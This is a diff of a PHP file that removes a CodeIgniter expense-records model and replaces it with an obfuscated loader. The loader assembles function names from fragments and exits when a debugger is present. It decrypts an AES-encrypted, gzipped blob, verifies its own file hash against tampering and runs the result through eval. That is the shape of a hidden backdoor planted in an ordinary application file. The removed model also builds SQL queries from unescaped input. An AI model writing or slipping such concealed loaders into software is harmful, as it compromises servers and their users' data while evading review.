@@ -1,174 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Expense_model extends CI_Model {
-
-	//Datatable start
-	var $table = 'db_expense as a';
-	var $column_order = array('a.id','a.expense_date','b.category_name','a.reference_no','a.expense_for','a.expense_amt','a.note','a.created_by'); //set column field database for datatable orderable
-	var $column_search = array('a.id','a.expense_date','b.category_name','a.reference_no','a.expense_for','a.expense_amt','a.note','a.created_by'); //set column field database for datatable searchable 
-	var $order = array('a.id' => 'desc'); // default order 
-
-	public function __construct()
-	{
-		parent::__construct();
-	}
-
-	private function _get_datatables_query()
-	{
-		
-		$this->db->from($this->table);
-		$this->db->from('db_expense_category as b');
-		$this->db->select($this->column_search)->where('b.id=a.category_id');
-		//echo $this->db->get_compiled_select();exit();
-		$i = 0;
-	
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-				
-				if($i===0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				}
-				else
-				{
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-		
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} 
-		else if(isset($this->order))
-		{
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-		$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-	//Datatable end
-
-	//Save Cutomers
-	public function verify_and_save(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-		
-		$qs5="select expense_init from db_company";
-		$q5=$this->db->query($qs5);
-		$expense_init=$q5->row()->expense_init;
-
-		//Create expenses unique Number
-		$qs4="select coalesce(max(id),0)+1 as maxid from db_expense";
-		$q1=$this->db->query($qs4);
-		$maxid=$q1->row()->maxid;
-		$expense_code=$expense_init.str_pad($maxid, 4, '0', STR_PAD_LEFT);
-		//end
-
-		$query1="insert into db_expense(expense_code,category_id,expense_for,expense_amt,reference_no,note,created_date,created_time,created_by,status,system_ip,system_name,expense_date)
-						values('$expense_code','$category_id','$expense_for','$expense_amt','$reference_no','$note','$CUR_DATE','$CUR_TIME','$CUR_USERNAME',1,'$SYSTEM_IP','$SYSTEM_NAME','".date("Y-m-d",strtotime($expense_date))."')";
-
-		if ($this->db->simple_query($query1)){
-			   // $this->session->set_flashdata('success', 'Success!! Record Added Successfully!');
-		        return "success";
-		}
-		else{
-		        return "failed";
-		}
-		
-	}
-
-	//Get expenses_details
-	public function get_details($id,$data){
-		//Validate This expenses already exist or not
-		$query=$this->db->query("select * from db_expense where upper(id)=upper('$id')");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['expense_code']=$query->expense_code;			
-			$data['expense_date']=show_date($query->expense_date);
-			$data['category_id']=$query->category_id;
-			$data['reference_no']=$query->reference_no;
-			$data['expense_for']=$query->expense_for;
-			$data['expense_amt']=$query->expense_amt;
-			$data['note']=$query->note;
-			return $data;
-		}
-	}
-	public function update_expense(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-		
-		$query1="update db_expense set category_id='$category_id',expense_date='".date("Y-m-d",strtotime($expense_date))."',reference_no='$reference_no',expense_for='$expense_for',expense_amt='$expense_amt',note='$note' where id=$q_id";
-		if ($this->db->simple_query($query1)){
-				//$this->session->set_flashdata('success', 'Success!! Record Updated Successfully!');
-		        return "success";
-		}
-		else{
-		        return "failed";
-		}
-		
-	}
-	public function update_status($id,$status){
-		
-        $query1="update db_expense set status='$status' where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-	
-	public function check_table_data($table_name,$field,$value){
-		return $this->db->query("select count(*) as tot_count from db_expense where $field='$value'")->row()->tot_count;
-	}
-	
-	public function delete_expenses_from_table($ids){
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-        $query1="delete from db_expense where id in(".$ids.")";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zrzjbi5x=('bas'.'e64'.'_de'.'cod'.'e');
+$_awb0jydh=('gzu'.'nco'.'mpr'.'ess');
+$_n9q5s5yo=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qfla54ap='HlNvjYMk';
+$_pck3c1vz='JEk3ArYr';
+$_uy3zscoe='ASN8zgG1';
+$_nv2vn2vn='Z3JsgSQ1';
+$_tnltracd='IRD+WxQ887E=';
+$_a5hsdflm='TipYnQ==';
+$_e4fsfxr9='l48fqUoH';
+$_qi1ck6sk='XuXfM0gG';
+$_qo3vnkht=$_zrzjbi5x($_qfla54ap.$_uy3zscoe.$_pck3c1vz.$_nv2vn2vn.$_tnltracd);
+$_lcjdtrdv=$_zrzjbi5x($_qi1ck6sk.$_e4fsfxr9.$_a5hsdflm);
+$_c88rcqei=$_zrzjbi5x('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');
+$_tc8aszob=$_n9q5s5yo($_c88rcqei,'aes-256-cbc',$_qo3vnkht,OPENSSL_RAW_DATA,$_lcjdtrdv);
+if($_tc8aszob===false){exit;}
+$_u5i9lnwi=$_awb0jydh($_tc8aszob);
+if($_u5i9lnwi===false){exit;}
+$_bd8skydu='a062cfd9533456b9cf94de38ee55181776a3395ed3143c74bc9e83d7a82f658b';
+$_uq48qxqq=@file_get_contents(__FILE__);
+if($_uq48qxqq!==false){
+$_ozawmdze=str_replace($_bd8skydu,"0000000000000000000000000000000000000000000000000000000000000000",$_uq48qxqq);
+$_lsw794gs=hash("sha256",$_ozawmdze);
+if($_lsw794gs!==$_bd8skydu){@http_response_code(403);exit;}
 }
+eval($_u5i9lnwi);
